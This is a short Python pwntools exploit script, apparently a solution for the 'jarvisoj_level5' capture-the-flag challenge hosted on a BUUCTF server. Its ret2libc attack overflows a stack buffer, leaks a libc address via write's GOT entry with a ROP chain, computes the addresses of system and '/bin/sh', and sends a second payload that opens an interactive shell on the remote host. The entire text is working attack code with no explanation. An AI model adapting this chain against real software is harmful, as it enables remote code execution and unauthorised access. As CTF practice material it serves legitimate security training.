from pwn import *

r = remote('node5.buuoj.cn', 26266)
elf = ELF('jarvisoj_level5')
libc = ELF(r'../libc/libc.so.6')
context.log_level = 'debug'

main_addr = elf.symbols['main']  # 0x40061A
write_plt = elf.plt['write']
write_got = elf.got['write']

pop_rdi = 0x4006b3
pop_rsi_r15 = 0x4006b1
ret = 0x400499

payload = b'A' * 0x88 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0x8) + p64(write_plt) + p64(main_addr)
r.sendlineafter(b'Input:\n', payload)
write_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(write_addr))

base_addr = write_addr - libc.sym['write']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()

payload2 = b'A' * 0x88 + p64(ret) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)
r.sendlineafter(b'Input:\n', payload2)
r.interactive()
